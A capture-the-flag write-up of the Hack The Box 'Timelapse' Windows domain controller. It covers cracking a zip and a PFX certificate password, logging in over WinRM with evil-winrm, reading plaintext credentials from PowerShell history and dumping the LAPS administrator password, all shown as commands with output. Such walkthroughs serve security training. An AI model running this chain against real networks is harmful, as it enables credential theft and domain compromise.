---
title: "HTB - Timelapse"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - Timelapse"
categories:
  - HTB
---

The given box ```Timelapse``` is a Windows machine 

![[Timelapse.png]]

## Recon

### Nmap Scan

`nmap` finds 18 open TCP ports, which look like typical Windows ports:

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/WINDOWS/timelapse]
└─# cat timelapse.nmap                         
# Nmap 7.92 scan initiated Thu Aug 25 21:43:44 2022 as: nmap -p- -sV -sC -oN timelapse.nmap -v 10.10.11.152
Nmap scan report for 10.10.11.152
Host is up (0.17s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-08-26 00:20:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-08-26T00:21:53+00:00; +7h59m59s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
60848/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-26T00:21:15
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 25 21:52:01 2022 -- 1 IP address (1 host up) scanned in 496.86 seconds
```

adding the hosts to `/etc/hosts` file

````10.10.11.152 timelapse.htb dc01.timelapse.htb````

## Enumeration

###  SMB

```shell
┌──(root㉿enum-more)-[~/…/obsidian_vault/htb/WINDOWS/timelapse]
└─# smbclient --no-pass  //10.10.11.152/Shares 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 21:09:15 2021
  ..                                  D        0  Mon Oct 25 21:09:15 2021
  Dev                                 D        0  Tue Oct 26 01:10:06 2021
  HelpDesk                            D        0  Mon Oct 25 21:18:42 2021

		6367231 blocks of size 4096. 2455917 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 01:10:06 2021
  ..                                  D        0  Tue Oct 26 01:10:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 21:16:42 2021

		6367231 blocks of size 4096. 2455917 blocks available
smb: \Dev\> cd..
cd..: command not found
smb: \Dev\> cd ..
smb: \> cd HelpDesk\
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 21:18:42 2021
  ..                                  D        0  Mon Oct 25 21:18:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 20:27:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 20:27:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 20:27:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 20:27:44 2021

		6367231 blocks of size 4096. 2455917 blocks available
smb: \HelpDesk\> exit
```

While unzipping winrm file it was protected with password,

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

Cracking the password with `fcrackzip` tool,

```shell
──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# fcrackzip -D -u winrm_backup.zip  -p /usr/share/wordlists/rockyou.txt


PASSWORD FOUND!!!!: pw == supremelegacy
```

Decoding the above command,

	-D -> use a dictionary
	-u -> use unzip to weed out wrong passwords
	-p -> use string as initial password/file

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

Using pfx2john tool to get the hash and decypting it

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# pfx2john legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash

┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# john legacyy_dev_auth.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:26 DONE (2022-08-27 19:09) 0.01155g/s 37343p/s 37343c/s 37343C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.     

```

#### Crack pfx Password

https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file

```
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
                                                                                                                                                                                   
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# ls legacyy_dev_auth.*
legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.key-enc  legacyy_dev_auth.pfx  legacyy_dev_auth.pfx.hash
                                                                       
```

## Initial Foothold

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# evil-winrm -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -i timelapse.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> ls
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/27/2022   2:14 PM             34 user.txt
```

## Privilege Escalation

```shell
*Evil-WinRM* PS C:\Users\legacyy\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls


    Directory: C:\Users\legacyy\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# evil-winrm -S -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
Users comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : +cNN0TX3NW@(3+z8++Xi8iwC
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

```shell
┌──(root㉿enum-more)-[~/…/htb/WINDOWS/timelapse/smb]
└─# evil-winrm -S -i timelapse.htb -u administrator -p '+cNN0TX3NW@(3+z8++Xi8iwC'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:/Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd TRX/Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> ls


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/27/2022   2:14 PM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
de0<redacted>
```